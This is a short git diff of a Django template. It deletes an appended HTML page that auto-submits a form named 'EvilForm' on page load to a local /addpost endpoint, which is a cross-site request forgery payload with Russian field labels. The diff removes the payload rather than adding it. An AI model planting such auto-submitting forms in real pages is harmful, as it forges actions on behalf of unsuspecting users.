@@ -20,17 +20,3 @@
     </div>
 </div>
 {% endblock %}
-
-<html>
-<body onload='document.EvilForm.submit()'>
-
-<form action="http://127.0.0.1:8000/addpost method="post" name='EvilForm'>
-  <table>
-    <tr><th><label for="id_name">Название:</label></th><td>
-        <input id="id_first_name" maxlength="100" type="text" required /></td></tr>
-    <tr><th><label for="id_content">Содержание:</label></th><td>
-        <input id="id_last_name" maxlength="100" type="text" required /></td></tr>
-  <input type="submit" value="Submit" />
-</form>
-</body>
-</html>
